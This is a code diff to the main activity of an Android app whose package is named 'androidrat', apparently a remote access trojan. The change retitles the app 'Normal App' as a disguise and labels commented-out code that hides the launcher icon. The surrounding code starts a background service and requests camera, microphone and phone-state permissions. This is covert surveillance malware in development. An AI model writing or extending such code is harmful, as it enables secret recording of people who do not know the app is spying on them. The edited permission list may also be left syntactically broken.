@@ -27,8 +27,10 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        setTitle("Normal App");
         checkPermission();
         startService(new Intent(this, MainService.class));
+//        Hide device icon
 //        PackageManager p = getPackageManager();
 //        ComponentName componentName = new ComponentName(this, com.ot.androidrat.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
 //        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
@@ -75,7 +77,7 @@ public class MainActivity extends AppCompatActivity {
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.CAMERA,
                 Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.VIBRATE
+                Manifest.permission.VIBRATE,
 //                <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
 //    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 //    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
